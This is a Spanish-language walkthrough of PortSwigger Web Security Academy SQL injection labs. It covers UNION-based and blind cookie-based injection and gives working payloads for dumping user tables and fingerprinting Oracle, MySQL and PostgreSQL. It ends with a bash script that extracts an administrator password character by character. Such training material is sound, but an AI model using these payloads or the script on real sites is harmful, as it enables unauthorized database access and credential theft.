---
description: All labs of Portswigger https://portswigger.net/web-security/all-labs
---

# SQL Injection

## SQLI UNION attack

### Determining the number of columns returned by the query

Tenemos en primer lugar una tienda con productos y filtros:

![Tienda con filtros y productos](<../.gitbook/assets/image (22) (1).png>)

Así que tras probar tanto pulsando en productos cómo en los filtros podemos ver las siguientes URLs.

```
filter?category=Food+%26+Drink
product?productId=1
```

Por lo que ambas pueden parecer susceptibles de ser inyectadas a través de GET, si probamos en la de filtros:

```
filter?category=Food+%26+Drink' or 1=1--
```

Vemos como se aplican todos y cada uno de los filtros, por lo que ya tenemos la URL inyectable. Ahora simplemente tenemos que elegir la opción que queramos para acabar, aunque el laboratorio sólo te da la siguiente cómo válida

```
filter?category=' union select null, null, null--
```

### Finding a column containing text

Muy sencillito tras hacer el anterior, tenemos que tener en cuenta que no todos los campos que añadimos a union select pueden soportar todos los caracteres distintos. Esto quiere decir que en ocasiones si queremos un output de una string tendremos que encontrar un campo compatible.

En este caso vemos que la vulnerabilidad la seguimos teniendo en el filtro:

```
filter?category=' union select null, null, null--
```

Por lo que tenemos que buscar en que parámetro nos permite utilizar la palabra que se ha generado, en mi caso "PscilI":

```
filter?category=' union select null, PscilI, null--
```

Es la única posición en la que se puede poner una string.

### Retrieving data from other tables

Volvemos a nuestra tienda, en esta ocasión para comenzar a sacar datos. Volvemos a tener la vulnerabilidad en los filtros, pero en esta ocasión son comentarios y únicamente son dos null, además de que ambas parece que pueden devolvernos una string.

```
filter?category='union select 'string', 'string' --
```

Cómo al principio del ejercicio nos dicen que podemos obtener un usuario y una contraseña de la tabla users podemos directamente imprimir todos aprovechándonos además de ambos campos.

```
filter?category=' union select username, password from users--

#Si solo tuviésemos un campo válido
filter?category=' union select CONCAT(username, ':', password), null from users--
```

Realizamos login con el usuario administrador y nos da por válido el laboratorio.

### Retrieving multiple values in a single column

Sin querer lo hemos medio chivado antes, en esta ocasión sólo hay un campo válido así que podemos concatenar.

```
filter?category=' union select null, CONCAT(username, ':', password) from users--

#La opción que te da PortSwigger es:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

Logueamos como administrador y acabamos.

### Querying the database type and version on Oracle

En esta ocasión tenemos Oracle ¿Qué debemos tener en cuenta?

|        Uso       | Comando                                                                   |
| :--------------: | ------------------------------------------------------------------------- |
|    Comentario    | --comentario                                                              |
| Versión de la BD | <p>SELECT banner FROM v$version </p><p>SELECT version FROM v$instance</p> |
|    Concatenar    | 'foo'\|\|'bar'                                                            |

También existe un tema importante y es el hecho de que cuando tenemos una DB Oracle delante nuestros union select tienen que ir acompañados de un FROM. Por ejemplo se puede utilizar FROM dual ya que es una tabla por defecto de Oracle. Sin utilizar el FROM no podremos determinar el número de columnas.

```
filter?category='union select null,null from dual--
```

Ahora simplemente usando la cheatsheet de arriba sabemos cómo obtenerlo:

```
filter?category='union select banner,null from v$version--
```

### Querying the database type and version on MySQL and Microsoft

Tremendamente fácil

```
filter?category=' union select version(), null-- -
```

### Listing the database contents on non-Oracle databases

Aquí es donde podemos empezar a aprender a listar diferentes detalles de las bases de datos:

```
#Los nombres de todas las bases de datos
' union select schema_name, null from information_schema.schemata-- -

#Podemos obtener todas las tablas o aquellas de bases de datos concretas
' union select table_name, null from information_schema.tables where table_schema='public'-- -

#A continuación columnas
' union select column_name, null from information_schema.columns where table_name='users_htqqgf' and table_schema='public'-- -

#Por último los datos
' union select CONCAT(username_tgaepb,':',password_kkmkfa),null from users_htqqgf-- - 
```

### Listing the database contents on Oracle

Es similar a las bases de datos Mysql pero con pequeñas diferencias.

```
#Obtener las tablas
' union select table_name, null from all_tables--

#Obtener las columnas
' union select column_name, null from all_tab_columns where table_name='USERS_NKHBTW'--

#Obtener los datos
' union select USERNAME_TIOZOM||':'||PASSWORD_SRGLLK, null from USERS_NKHBTW--
```

## Blind SQLI attack

En esta ocasión nos va a tocar inyectar SQL dentro de una Cookie (Muy interesante por cierto) Así que vamos a por ello.

Si nosotros introducimos la cookie seguido de lo siguiente vemos un mensaje de Welcome Back

```
cookie' and 1=1-- -
```

Y si es incorrecta la sentencia no aparece dicho mensaje:

```
cookie' and 1=2-- -
```

Por lo que ya sabemos la manera de inyectar, lo que ocurre que estamos ante una inyección ciega, esto quiere decir que vamos a tener que hacer preguntas a la base de datos para determinar cómo continuar.

En primer lugar a mi me parece interesante averiguar qué base de datos está detras, es cierto que con el comentario propio de Mysql ha funcionado, pero es que dicho comentario funciona en todas, por lo que vamos a probar a quitar el espacio tras los guiones:

```
cookie' and 1=1--
```

Y sigue funcionando, por lo que en principio podemos descartar que estemos ante MYSQL, pero ¿Cuál de las demás será? Podríamos utilizar inyecciones basadas en tiempo para determinarlo:

```
cookie' RLIKE sleep(5)-- - #Mysql no es necesaria ya que la hemos descartado
cookie' and 1234=(select 1234 from pg_sleep(5))-- #PostgreSQL
```

No hay que buscar más, estamos ante una PostgreSQL ya que ha funcionado el Payload de tiempo.

Parece ser que tenemos una tabla llamada _users_ con unas columnas llamadas _username _y _password_. Y tenemos que encontrar la contraseña del usuario _administrator_.

Entonces no hace falta que busquemos las tablas y las columnas, podemos ir directamente a buscar la contraseña del usuario que nos piden.

```
cookie' and (select substring(password,1,1) from users where username='administrator')='w'--
```

Podríamos hacerlo de esta manera, ir preguntando a la base de datos carácter a carácter hasta sacar la contraseña del usuario administrador. Sabemos que cada vez que sea correcta la letra nos dirá _Welcome back_.

Una forma de hacerlo sería enviarlo al intruder de Burpsuite y que se encargue de las comprobaciones, pero para hacerlo de esta manera lo ideal sería saber el número de caracteres que tiene la contraseña.

```
cookie' and (select 'a' from users where username='administrator' and length(password)>10)='a'--
cookie' ' and (select 'a' from users where username='administrator' and length(password)=20)='a'--
```

Cómo podéis ver es ir preguntando si es mayor que, os recomiendo ir de 5 en 5 y podéis confirmar como he hecho yo si efectivamente son 20. Así que ya podemos enviar esto al intruder de Burpsuite.

![Intruder de Burpsuite](<../.gitbook/assets/image (24).png>)

El tipo de ataque es un Cluster Bomb para conseguir iterar correctamente entre los dos parámetros que hemos marcado.

A continuación en Payloads tendremos que poner letras y números al segundo parámetro y números del 1 al 20 al primer parámetro. Por otro lado en grep extract por facilitarnos el trabajo marcaremos el mensaje de _Welcome Back_ para verlo durante el ataque.

Es cierto que funcionar funciona, lo podéis ver en la siguiente imagen, pero el problema real está en que con la Community Edition de Burpsuite te eternizas para algo que podría sacarse en pocos segundos. Si sois nuevos en todo este mundillo como yo os recomiendo que hagáis vuestros propios scripts siempre que podáis. De esta manera entendéis mejor que estáis haciendo y por otro lado aprendéis más y cogéis soltura.

![Intruder de Burpsuite](<../.gitbook/assets/image (21).png>)

Así que he preferido hacer mi propio script.

```
#!/bin/bash
respuesta=""
#curl -s https://acd41f5f1e23489cc0d125c200da008b.web-security-academy.net/ --cookie "TrackingId=pvJaKsOkvLKbfdv4" | grep Welcome
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do
	for a in a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0; do
		respuesta=$(curl -s https://acd41f5f1e23489cc0d125c200da008b.web-security-academy.net/ --cookie "TrackingId=pvJaKsOkvLKbfdv4' and (select substring(password,$i,1) from users where username='administrator')='$a'--" | grep -o Welcome)
		if [ "$respuesta" == "Welcome" ]; then
			echo "$i letra es $a"
			pass=$pass$a
			break
		fi
		respuesta=""
	done
	respuesta=""
done
echo $pass
```

Nada del otro mundo, dos bucles uno para cada argumento que va a ir cambiando y un output, ni está bonito ni es el mejor, pero en un par de minutos estaba hecho.

![Salida de mi script](<../.gitbook/assets/image (27).png>)

Otro más acabado, así que a por el siguiente.
